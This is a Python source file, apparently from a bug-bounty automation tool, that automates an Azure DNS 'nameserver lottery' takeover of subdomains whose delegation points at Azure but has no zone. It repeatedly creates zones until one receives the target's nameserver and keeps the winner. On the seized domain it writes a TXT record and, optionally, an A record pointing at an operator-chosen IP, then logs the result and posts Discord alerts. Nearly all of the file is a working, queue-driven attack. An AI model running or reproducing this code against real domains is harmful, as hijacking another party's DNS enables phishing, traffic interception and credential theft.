"""
app/takeover/providers/azure_dns_takeover.py

Azure DNS zone NS-lottery takeover — automated PoC for dangling Azure DNS delegation.

HOW IT WORKS
------------
Azure DNS assigns nameservers randomly from a fixed pool when a hosted zone is
created.  If a domain's NS delegation points to Azure DNS but no zone exists,
an attacker can create a zone and win the correct NS by lottery:

  1. Create up to NUM_GROUPS resource groups + DNS zones simultaneously.
     Each gets a random Azure NS assignment.
  2. Check each zone's assigned NS for the TARGET_SHARD substring.
  3. On match: add TXT PoC record (and optional A record if POC_IP configured).
     Keep the winning zone.  Delete all losers.
  4. On no match in the single pass: delete all zones, fire a failure Discord
     notification, stop (no retry).

RESOURCE GROUP NAMING — collision-safe
----------------------------------------
  RG names are derived from the target domain, not a static prefix+integer.
  Two concurrent scans for different targets never collide.

  Format: poc-{sanitized_domain}-{index}
    sanitized = dots→hyphens, non-alphanumeric stripped, truncated to ≤ 90 chars total.

  Example: api.example.com → poc-api-example-com-1 … poc-api-example-com-20

  Two scans for the SAME target simultaneously are prevented by the in-flight
  set guard in the queue — second enqueue is rejected before any Azure calls.

CONFIG (.env)
-------------
  AZURE_TENANT_ID              — required (reused from azure takeover block)
  AZURE_CLIENT_ID              — required
  AZURE_CLIENT_SECRET          — required
  AZURE_SUBSCRIPTION_ID        — required
  AZURE_DNS_TAKEOVER_ENABLED   = true
  AZURE_DNS_NUM_GROUPS         = 20
  AZURE_DNS_LOCATION           = eastus
  POC_TXT                      = "Bugbounty - DNS takeover POC by Rizin"
  POC_TTL                      = 300
  POC_IP                       = ""   (optional — A record on success)

INTEGRATION
-----------
  AzureDNSTakeoverQueue.enqueue(subdomain, target_shard, program_name, platform)
  AzureDNSTakeoverQueue.start_worker()   # once at daemon startup

DB COLUMN REQUIRED
------------------
  subdomains.azure_dns_attempted_at  TIMESTAMP  nullable

  Add to run_enum_migrations() in app/db/session.py:
    "ALTER TABLE subdomains ADD COLUMN IF NOT EXISTS azure_dns_attempted_at TIMESTAMP",
    "CREATE INDEX IF NOT EXISTS ix_subdomains_azure_dns_attempted_at ON subdomains (azure_dns_attempted_at)",
"""

from __future__ import annotations

import asyncio
import re
from dataclasses import dataclass
from datetime import datetime
from typing import List, Optional, Set, Tuple

from app.core.config import settings
from app.core.logging import logger
from app.db.session import get_session


# ---------------------------------------------------------------------------
# Config helpers
# ---------------------------------------------------------------------------

def _cfg(key: str, default):
    return getattr(settings, key, default)


def _azure_dns_enabled() -> bool:
    return (
        bool(_cfg("AZURE_DNS_TAKEOVER_ENABLED", True))
        and bool(_cfg("AZURE_TENANT_ID", None))
        and bool(_cfg("AZURE_CLIENT_ID", None))
        and bool(_cfg("AZURE_CLIENT_SECRET", None))
        and bool(_cfg("AZURE_SUBSCRIPTION_ID", None))
    )


def _is_valid_ipv4(ip: str) -> bool:
    parts = ip.split(".")
    if len(parts) != 4:
        return False
    try:
        return all(0 <= int(p) <= 255 for p in parts)
    except ValueError:
        return False


def _rg_name(subdomain_name: str, index: int) -> str:
    """
    Build a collision-safe Azure resource group name for a given subdomain + index.

    Format: poc-{sanitized}-{index}
    - dots → hyphens
    - strip non-alphanumeric/hyphen chars
    - collapse consecutive hyphens
    - truncate so total length ≤ 90 chars (Azure limit)

    Examples:
      api.example.com, 1  → poc-api-example-com-1
      sub.long-target.io, 20 → poc-sub-long-target-io-20
    """
    sanitized = subdomain_name.lower()
    sanitized = sanitized.replace(".", "-")
    sanitized = re.sub(r"[^a-z0-9\-]", "", sanitized)
    sanitized = re.sub(r"-{2,}", "-", sanitized)
    sanitized = sanitized.strip("-")

    suffix   = f"-{index}"
    prefix   = "poc-"
    max_body = 90 - len(prefix) - len(suffix)
    if len(sanitized) > max_body:
        sanitized = sanitized[:max_body].rstrip("-")

    return f"{prefix}{sanitized}{suffix}"


# ---------------------------------------------------------------------------
# Job dataclass
# ---------------------------------------------------------------------------

@dataclass
class _AzureDNSJob:
    subdomain_id:   int
    subdomain_name: str   # e.g. "api.example.com"
    target_shard:   str   # NS shard number substring, e.g. "05"
    program_name:   str
    platform:       str
    scope_id:       int


# ---------------------------------------------------------------------------
# Core lottery logic
# ---------------------------------------------------------------------------

async def _run_azure_dns_lottery(job: _AzureDNSJob) -> Tuple[bool, List[str]]:
    """
    Single-pass Azure DNS NS lottery.

    Returns (True, winning_ns_list) on success, (False, []) on failure.
    """
    try:
        from azure.identity.aio import ClientSecretCredential
        from azure.mgmt.dns.aio import DnsManagementClient
        from azure.mgmt.resource.aio import ResourceManagementClient
    except ImportError:
        logger.error(
            "azure_dns_takeover: azure-mgmt-dns / azure-mgmt-resource not installed. "
            "pip install azure-mgmt-dns azure-mgmt-resource azure-identity"
        )
        return False, []

    num_groups    = int(_cfg("AZURE_DNS_NUM_GROUPS", 20))
    location      = str(_cfg("AZURE_DNS_LOCATION", "eastus"))
    poc_txt       = str(_cfg("POC_TXT", "Bugbounty - DNS takeover POC by Rizin"))
    poc_ttl       = int(_cfg("POC_TTL", 300))
    poc_ip        = str(_cfg("POC_IP", "") or "").strip()

    tenant_id     = str(_cfg("AZURE_TENANT_ID", ""))
    client_id     = str(_cfg("AZURE_CLIENT_ID", ""))
    client_secret = str(_cfg("AZURE_CLIENT_SECRET", ""))
    subscription  = str(_cfg("AZURE_SUBSCRIPTION_ID", ""))

    target_domain = job.subdomain_name
    target_shard  = job.target_shard.lower()

    logger.info(
        "azure_dns_takeover: starting single-pass lottery for %s "
        "(shard=%s, groups=%d)",
        target_domain, target_shard, num_groups,
    )

    credential = ClientSecretCredential(tenant_id, client_id, client_secret)
    dns_client = DnsManagementClient(credential, subscription)
    res_client = ResourceManagementClient(credential, subscription)

    active_rgs: List[str] = []
    winning_rg: Optional[str] = None
    winning_ns: List[str] = []

    try:
        # ── PHASE 1: FILL ─────────────────────────────────────────────────────
        for i in range(1, num_groups + 1):
            rg_name = _rg_name(target_domain, i)
            try:
                logger.debug(
                    "azure_dns_takeover: [%d/%d] creating RG %s",
                    i, num_groups, rg_name,
                )

                await res_client.resource_groups.create_or_update(
                    rg_name, {"location": location}
                )
                active_rgs.append(rg_name)

                zone = await dns_client.zones.create_or_update(
                    rg_name, target_domain, {"location": "global"}
                )
                ns_list = zone.name_servers or []
                logger.debug(
                    "azure_dns_takeover: %s assigned NS: %s", rg_name, ns_list
                )

                if any(f"-{target_shard}." in ns.lower() for ns in ns_list):
                    logger.info(
                        "azure_dns_takeover: MATCH on shard '%s' in %s — NS=%s",
                        target_shard, rg_name, ns_list,
                    )
                    winning_rg = rg_name
                    winning_ns = list(ns_list)
                    break

                logger.debug(
                    "azure_dns_takeover: %s no match — keeping to block shard",
                    rg_name,
                )

            except asyncio.CancelledError:
                raise
            except Exception as exc:
                logger.warning(
                    "azure_dns_takeover: error creating %s: %s — skipping",
                    rg_name, exc,
                )

        # ── PHASE 2: RESULT ───────────────────────────────────────────────────
        if winning_rg:
            await _add_poc_records(
                dns_client, winning_rg, target_domain,
                poc_txt, poc_ttl, poc_ip,
            )

            logger.info(
                "azure_dns_takeover: cleaning up %d loser RGs",
                len(active_rgs) - 1,
            )
            for rg in active_rgs:
                if rg != winning_rg:
                    try:
                        await res_client.resource_groups.begin_delete(rg)
                    except Exception as exc:
                        logger.warning(
                            "azure_dns_takeover: failed to delete loser RG %s: %s",
                            rg, exc,
                        )

            return True, winning_ns

        else:
            logger.info(
                "azure_dns_takeover: no NS match after %d zones for %s — cleaning up",
                len(active_rgs), target_domain,
            )
            for rg in active_rgs:
                try:
                    await res_client.resource_groups.begin_delete(rg)
                except Exception as exc:
                    logger.warning(
                        "azure_dns_takeover: cleanup failed for %s: %s", rg, exc
                    )
            return False, []

    except asyncio.CancelledError:
        logger.info(
            "azure_dns_takeover: cancelled — cleaning up %d RGs", len(active_rgs)
        )
        for rg in active_rgs:
            try:
                await res_client.resource_groups.begin_delete(rg)
            except Exception:
                pass
        raise

    finally:
        await dns_client.close()
        await res_client.close()
        await credential.close()


async def _add_poc_records(
    dns_client,
    resource_group: str,
    domain: str,
    poc_txt: str,
    poc_ttl: int,
    poc_ip: str,
) -> None:
    """Add TXT (always) and A (if POC_IP valid) to the winning zone."""
    try:
        await dns_client.record_sets.create_or_update(
            resource_group, domain, "@", "TXT",
            {"ttl": poc_ttl, "txt_records": [{"value": [poc_txt]}]},
        )
        logger.info("azure_dns_takeover: TXT record added to %s", domain)
    except asyncio.CancelledError:
        raise
    except Exception as exc:
        logger.error(
            "azure_dns_takeover: TXT add failed for %s: %s — add manually (RG: %s)",
            domain, exc, resource_group,
        )

    if poc_ip and _is_valid_ipv4(poc_ip):
        try:
            await dns_client.record_sets.create_or_update(
                resource_group, domain, "@", "A",
                {"ttl": poc_ttl, "a_records": [{"ipv4_address": poc_ip}]},
            )
            logger.info(
                "azure_dns_takeover: A record added %s → %s", domain, poc_ip
            )
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            logger.error(
                "azure_dns_takeover: A record add failed for %s (%s): %s — "
                "add manually (RG: %s)", domain, poc_ip, exc, resource_group,
            )
    elif poc_ip:
        logger.warning(
            "azure_dns_takeover: POC_IP=%r is not valid IPv4 — skipping A record",
            poc_ip,
        )


# ---------------------------------------------------------------------------
# DB helpers
# ---------------------------------------------------------------------------

async def _stamp_attempted(subdomain_id: int) -> None:
    from app.db.db_models import Subdomain as _Sub
    from sqlalchemy import select
    try:
        async with get_session() as session:
            sub = (await session.execute(
                select(_Sub).where(_Sub.id == subdomain_id)
            )).scalar_one_or_none()
            if sub:
                sub.azure_dns_attempted_at = datetime.utcnow()
                await session.commit()
    except asyncio.CancelledError:
        raise
    except Exception as exc:
        logger.error(
            "azure_dns_takeover: stamp attempted failed id=%d: %s", subdomain_id, exc
        )


async def _stamp_success(subdomain_id: int, winning_ns: List[str]) -> None:
    from app.db.db_models import Subdomain as _Sub, SubdomainState
    from sqlalchemy import select
    poc_ip = str(_cfg("POC_IP", "") or "").strip()
    try:
        async with get_session() as session:
            sub = (await session.execute(
                select(_Sub).where(_Sub.id == subdomain_id)
            )).scalar_one_or_none()
            if sub:
                a_note = f" A record → {poc_ip}." if poc_ip and _is_valid_ipv4(poc_ip) else ""
                sub.azure_dns_attempted_at = datetime.utcnow()
                sub.takeover_provider      = "Azure DNS (NS lottery)"
                sub.takeover_evidence      = (
                    f"NS lottery matched. Winning NS: {winning_ns}. "
                    f"TXT PoC added.{a_note} Zone kept — screenshot and report."
                )
                sub.confidence           = 95
                sub.state                = SubdomainState.DANGLING
                sub.last_state_change_at = datetime.utcnow()
                await session.commit()
                logger.info(
                    "azure_dns_takeover: %s → DANGLING confidence=95", sub.name
                )
    except asyncio.CancelledError:
        raise
    except Exception as exc:
        logger.error(
            "azure_dns_takeover: stamp success failed id=%d: %s", subdomain_id, exc
        )


# ---------------------------------------------------------------------------
# Discord notifications
# ---------------------------------------------------------------------------

async def _notify_success(job: _AzureDNSJob, winning_ns: List[str]) -> None:
    """Fire Discord result alert when Azure DNS NS lottery SUCCEEDS (2nd notification)."""
    if not getattr(settings, "DISCORD_WEBHOOK_URL", None):
        return
    poc_ip  = str(_cfg("POC_IP", "") or "").strip()
    poc_txt = str(_cfg("POC_TXT", "Bugbounty PoC"))
    try:
        from app.notify.discord import DiscordNotifier
        await DiscordNotifier().notify_ns_takeover_result(
            subdomain_name = job.subdomain_name,
            provider       = "Azure DNS",
            success        = True,
            program_name   = job.program_name,
            platform       = job.platform,
            winning_ns     = winning_ns,
            poc_txt        = poc_txt,
            poc_ip         = poc_ip if poc_ip else None,
            zone_detail    = "Zone kept in Azure — screenshot, report, then delete winning resource group via Portal.",
        )
    except asyncio.CancelledError:
        raise
    except Exception as exc:
        logger.error("azure_dns_takeover: Discord success notify failed: %s", exc)

async def _notify_failure(job: _AzureDNSJob) -> None:
    """Fire Discord result alert when Azure DNS NS lottery FAILS (2nd notification)."""
    if not getattr(settings, "DISCORD_WEBHOOK_URL", None):
        return
    num_groups = int(_cfg("AZURE_DNS_NUM_GROUPS", 20))
    try:
        from app.notify.discord import DiscordNotifier
        await DiscordNotifier().notify_ns_takeover_result(
            subdomain_name = job.subdomain_name,
            provider       = "Azure DNS",
            success        = False,
            program_name   = job.program_name,
            platform       = job.platform,
            error_detail   = (
                f"Single-pass lottery ({num_groups} zones) found no NS shard match. "
                f"All resource groups cleaned up. Target shard: `{job.target_shard}`"
            ),
        )
    except asyncio.CancelledError:
        raise
    except Exception as exc:
        logger.error("azure_dns_takeover: Discord failure notify failed: %s", exc)

# ---------------------------------------------------------------------------
# Queue + background worker
# ---------------------------------------------------------------------------

class AzureDNSTakeoverQueue:
    """
    Singleton async queue for Azure DNS lottery jobs.

    Usage
    -----
      AzureDNSTakeoverQueue.enqueue(subdomain, target_shard, program_name, platform)
      AzureDNSTakeoverQueue.start_worker()   # once at daemon startup
    """

    _queue:     asyncio.Queue          = asyncio.Queue()
    _worker:    Optional[asyncio.Task] = None
    _in_flight: Set[int]               = set()

    @classmethod
    def enqueue(
        cls,
        subdomain,
        target_shard: str,
        program_name: str,
        platform: str,
    ) -> bool:
        if not _azure_dns_enabled():
            logger.debug(
                "azure_dns_takeover: disabled or creds not set — skipping %s",
                subdomain.name,
            )
            return False

        if getattr(subdomain, "azure_dns_attempted_at", None) is not None:
            logger.debug(
                "azure_dns_takeover: %s already attempted — skipping", subdomain.name
            )
            return False

        if subdomain.id in cls._in_flight:
            logger.debug(
                "azure_dns_takeover: %s already in-flight — skipping", subdomain.name
            )
            return False

        job = _AzureDNSJob(
            subdomain_id   = subdomain.id,
            subdomain_name = subdomain.name,
            target_shard   = target_shard,
            program_name   = program_name,
            platform       = platform,
            scope_id       = getattr(subdomain, "scope_id", 0),
        )
        cls._in_flight.add(subdomain.id)
        cls._queue.put_nowait(job)
        logger.info(
            "azure_dns_takeover: enqueued %s shard=%s (queue depth=%d)",
            subdomain.name, target_shard, cls._queue.qsize(),
        )
        return True

    @classmethod
    def start_worker(cls) -> None:
        if cls._worker is None or cls._worker.done():
            cls._worker = asyncio.create_task(cls._worker_loop())
            logger.info("azure_dns_takeover: background worker started")

    @classmethod
    async def _worker_loop(cls) -> None:
        job = None
        while True:
            try:
                job = await cls._queue.get()
                logger.info(
                    "azure_dns_takeover: processing %s shard=%s",
                    job.subdomain_name, job.target_shard,
                )

                await _stamp_attempted(job.subdomain_id)

                try:
                    success, winning_ns = await _run_azure_dns_lottery(job)
                except asyncio.CancelledError:
                    cls._queue.task_done()
                    raise
                except Exception as exc:
                    logger.error(
                        "azure_dns_takeover: unhandled error for %s: %s",
                        job.subdomain_name, exc,
                    )
                    success, winning_ns = False, []

                if success:
                    await _stamp_success(job.subdomain_id, winning_ns)
                    await _notify_success(job, winning_ns)
                else:
                    await _notify_failure(job)

            except asyncio.CancelledError:
                logger.info("azure_dns_takeover: worker shutting down")
                return
            except Exception as exc:
                logger.error("azure_dns_takeover: worker loop error: %s", exc)
            finally:
                if job is not None:
                    cls._in_flight.discard(job.subdomain_id)
                    job = None
                try:
                    cls._queue.task_done()
                except Exception:
                    pass